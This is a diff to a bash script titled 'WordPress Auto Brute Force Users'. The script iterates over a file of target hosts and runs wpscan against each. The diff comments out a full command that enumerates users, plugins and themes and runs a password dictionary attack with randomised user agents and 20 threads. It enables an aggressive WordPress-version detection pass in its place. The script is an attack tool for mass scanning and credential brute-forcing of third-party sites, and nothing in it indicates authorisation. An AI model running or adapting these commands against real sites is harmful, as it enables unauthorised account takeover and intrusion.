@@ -22,7 +22,7 @@ UNDERLINE=$(tput smul)
 clear
 
 printf "${BLUE}\n########################################################################${NORMAL}\n"
-printf "${BLUE}##                 WordPress Auto Brute Force Users                   ##${NORMAL}\n"
+printf "${RED}##                 WordPress Auto Brute Force Users                   ##${NORMAL}\n"
 printf "${BLUE}##                     Leighton-0    (Jan 2023)                       ##${NORMAL}"
 printf "${BLUE}\n########################################################################${NORMAL}\n"
 
@@ -45,9 +45,9 @@ for fn in `cat $wl_pass`; do
 #printf "%s ${RED}TARGET NAME:- \n" $fn ${NORMAL}\n >> "results.${d}.1"
 printf "${RED}\n================================================================================\n" >> "results.${d}.1"
 printf "TARGET NAME:- %s \n" ${fn} >> "results.${d}.1"
-wpscan --url $fn -e  u vp vt --passwords z_passwords --no-banner --no-update --random-user-agent --max-threads 20 --ignore-main-redirect --force >> "results.${d}"
+# wpscan --url $fn -e  u vp vt --passwords z_passwords --no-banner --no-update --random-user-agent --max-threads 20 --ignore-main-redirect --force >> "results.${d}"
 	# Designed to identify uses and carry out dictionary attack
-# wpscan --url $fn --no-update --random-user-agent --ignore-main-redirect --wp-version-detection aggressive --no-banner >> "results.${d}.1"
+wpscan --url $fn --no-update --random-user-agent --ignore-main-redirect --wp-version-detection aggressive --no-banner >> "results.${d}.1"
 	# Designed to identify which sites are running WP from a file of IP addresses
 	# --force disable WP detection; --wp-version-detection aggressive
 I=$((I+1))
